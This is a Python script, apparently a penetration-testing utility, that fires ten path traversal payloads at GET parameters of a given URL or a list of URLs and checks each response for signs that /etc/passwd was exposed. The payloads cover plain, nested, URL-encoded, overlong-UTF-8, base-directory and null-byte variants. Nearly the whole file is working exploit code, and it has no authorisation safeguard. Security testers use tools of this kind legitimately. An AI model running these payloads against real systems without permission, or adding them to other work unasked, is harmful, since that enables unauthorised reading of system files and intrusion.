#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Dynamic Path Traversal Tester (GET)
"""

import argparse
import sys
import time
import re
from urllib.parse import urlparse, parse_qs
import requests
from colorama import Fore, Style, init

init(autoreset=True)

TECHNIQUES = [
    ("T01", "Absolute path",                   lambda: "/etc/passwd"),
    ("T02", "Simple traversal ../ x6",         lambda: "../"*6 + "etc/passwd"),
    ("T03", "Nested traversal ....// x3",      lambda: "....//"*3 + "etc/passwd"),
    ("T04", r"Nested traversal ....\/ x3",     lambda: "....\\/"*3 + "etc/passwd"),
    ("T05", "Single URL-encoded ../ x3",       lambda: "%2e%2e%2f"*3 + "etc/passwd"),
    ("T06", "Double URL-encoded ../ x3",       lambda: "%252e%252e%252f"*3 + "etc/passwd"),
    ("T07", "Non-standard ..%c0%af x3",        lambda: "..%c0%af"*3 + "etc/passwd"),
    ("T08", "Non-standard ..%ef%bc%8f x3",     lambda: "..%ef%bc%8f"*3 + "etc/passwd"),
    ("T09", "Base-dir bypass /var/www/images", lambda: "/var/www/images/../../../etc/passwd"),
    ("T10", "Null byte terminator png",        lambda: "../../../etc/passwd%00.png"),
]

USER_AGENT = "dynamic-path-traversal-tester/1.1"

PASSWD_LINE_RX = re.compile(
    r'(?m)^[a-z_][a-z0-9_-]*:[^:]*:\d+:\d+:[^:]*:/[^:]*:/[^:\n]*\s*$'
)


def build_get_url(base_url: str, param: str, value: str) -> str:
    sep = '&' if ('?' in base_url) else '?'
    return f"{base_url}{sep}{param}={value}"


def looks_like_etc_passwd(body: str) -> dict:
    signals = 0
    if "root:x:0:0:" in body:
        signals += 2
    if "/bin/" in body:
        signals += 1
    if ":/home/" in body:
        signals += 1
    lines = PASSWD_LINE_RX.findall(body)
    if len(lines) >= 3:
        signals += 2
    matched = signals >= 3
    snippet = ""
    if matched:
        snippet = "\n".join(lines[:5])
    return {"matched": matched, "score": signals, "snippet": snippet}


def test_target(session, url, params, delay, timeout, insecure, follow, verbose):
    if verbose:
        print(f"\n[+] Target: {url}")
        print(f"[+] Params: {', '.join(params)}")
        print(f"[+] Techniques: {len(TECHNIQUES)}\n")
    else:
        print(f"\n{Fore.CYAN}[TARGET]{Style.RESET_ALL} {url}")

    any_hit = False

    for param in params:
        for tid, desc, builder in TECHNIQUES:
            payload = builder()
            test_url = build_get_url(url, param, payload)

            try:
                resp = session.get(
                    test_url,
                    timeout=timeout,
                    verify=not insecure,
                    allow_redirects=follow,
                )
                body = resp.text or ""
                det = looks_like_etc_passwd(body)

                status = resp.status_code
                size = len(body.encode("utf-8", errors="ignore"))

                if verbose:
                    print(f"{tid} | {desc} | param={param}")
                    print(f"    URL     : {test_url}")
                    print(f"    Status  : {status}  Size: {size} bytes")
                    if det["matched"]:
                        any_hit = True
                        print("    RESULT  : POSSIBLE /etc/passwd LEAK ✅")
                        if det["snippet"]:
                            for ln in det["snippet"].splitlines()[:5]:
                                print(f"      > {ln}")
                    else:
                        print("    RESULT  : no match")
                    print()
                else:
                    if det["matched"]:
                        any_hit = True
                        print(f"{Fore.GREEN}[{tid}] {desc} ({param}) → POSSIBLE LEAK!{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.YELLOW}[{tid}] {desc} ({param}) → No match{Style.RESET_ALL}")

            except requests.RequestException as e:
                if verbose:
                    print(f"{tid} | {desc}")
                    print(f"    URL     : {test_url}")
                    print(f"    ERROR   : {e}\n")
                else:
                    print(f"{Fore.RED}[{tid}] {desc} ERROR: {e}{Style.RESET_ALL}")

            time.sleep(delay)

    if verbose:
        if any_hit:
            print("[!] Au moins une technique semble exposer /etc/passwd.")
        else:
            print("[✓] Aucune détection de /etc/passwd.")
    else:
        if any_hit:
            print(f"\n{Fore.RED}[!] At least one technique seems to expose /etc/passwd{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}[✓] No /etc/passwd leak detected{Style.RESET_ALL}")


def main():
    ap = argparse.ArgumentParser(
        description="Dynamic Path Traversal Tester (GET)"
    )
    ap.add_argument("-u", "--url", help="Target endpoint (ex: http://localhost:8080/download)")
    ap.add_argument("-p", "--param", help="Parameter name to inject (ex: filename). If not provided, all query params will be tested.")
    ap.add_argument("--list", help="File containing a list of URLs to test")
    ap.add_argument("--delay", type=float, default=0.2, help="Delay between requests (s)")
    ap.add_argument("--timeout", type=float, default=10.0, help="Request timeout (s)")
    ap.add_argument("--insecure", action="store_true", help="Do not verify TLS")
    ap.add_argument("--follow", action="store_true", help="Follow redirects")
    ap.add_argument("--verbose", action="store_true", help="Verbose output (original format)")
    args = ap.parse_args()

    urls = []
    if args.list:
        with open(args.list, "r") as f:
            urls = [line.strip() for line in f if line.strip()]
    elif args.url:
        urls = [args.url]
    else:
        print("[ABORT] You must provide -u/--url or --list")
        sys.exit(1)

    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT, "Accept": "*/*"})

    for url in urls:
        parsed = urlparse(url)
        query_params = list(parse_qs(parsed.query).keys())
        params_to_test = [args.param] if args.param else query_params or ["filename"]
        test_target(session, url, params_to_test, args.delay, args.timeout, args.insecure, args.follow, args.verbose)


if __name__ == "__main__":
    main()
